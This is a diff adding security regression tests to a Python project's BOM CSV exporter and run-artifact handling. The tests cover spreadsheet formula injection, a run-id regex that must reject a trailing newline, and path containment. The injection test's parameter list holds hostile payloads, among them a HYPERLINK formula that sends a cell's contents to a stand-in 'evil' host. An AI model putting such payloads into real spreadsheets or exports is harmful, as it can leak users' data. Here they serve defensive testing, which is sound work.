@@ -299,3 +299,63 @@ def test_explicit_override_wins_both_ways(monkeypatch):
     assert importlib.reload(_main)._ENABLE_RUN_ENDPOINT is True
     monkeypatch.delenv("MIRUM_ENABLE_RUN_ENDPOINT", raising=False)
     importlib.reload(_main)
+
+
+# ---------------------------------------------------------------------------
+# Security-review follow-ups (2026-09-10)
+# ---------------------------------------------------------------------------
+
+@pytest.mark.parametrize("payload", [
+    "=HYPERLINK(\"http://evil/\"&A1,\"click\")",
+    "+1+1",
+    "-2+3",
+    "@SUM(A1:A9)",
+    "\tleading tab",
+    "\rleading cr",
+])
+def test_bom_csv_neutralises_formula_injection(payload):
+    """A BOM is made to be shared; descriptions are LLM output steered by the
+    user's prompt, so a leading '='/'@' would execute on a colleague's machine."""
+    from verification.bom import to_csv
+    csv_text = to_csv([{
+        "part_id": payload, "quantity": 1, "material": payload,
+        "mass_g": 1.0, "line_mass_g": 1.0,
+        "instances": [payload], "description": payload,
+    }])
+    for line in csv_text.splitlines()[1:]:
+        for cell in line.split(","):
+            stripped = cell.strip().strip('"')
+            assert not stripped.startswith(("=", "+", "-", "@", "\t", "\r")), (
+                f"unneutralised formula cell: {cell!r}"
+            )
+
+
+def test_bom_csv_leaves_ordinary_text_alone():
+    from verification.bom import to_csv
+    csv_text = to_csv([{
+        "part_id": "leg_1", "quantity": 4, "material": "aluminum",
+        "mass_g": 12.5, "line_mass_g": 50.0,
+        "instances": ["leg_1"], "description": "60mm square leg",
+    }])
+    assert "leg_1" in csv_text and "'leg_1" not in csv_text
+
+
+def test_run_id_regex_rejects_trailing_newline():
+    """`$` also matches before a trailing newline — fullmatch does not."""
+    assert not artifacts.is_valid_run_id("a" * 32 + "\n")
+    assert artifacts.is_valid_run_id("a" * 32)
+
+
+def test_artifact_path_is_contained_even_for_valid_ids():
+    run_id = artifacts.new_run_id()
+    path = artifacts.artifact_path(run_id, "step")
+    assert path is not None
+    assert str(path).startswith(str(artifacts._RUNS_DIR.resolve()) + os.sep)
+
+
+def test_create_run_does_not_rely_on_assert():
+    """Bare asserts vanish under `python -O`; this guard must survive."""
+    import inspect
+    src = inspect.getsource(artifacts.create_run)
+    assert "assert " not in src
+    assert "raise RuntimeError" in src
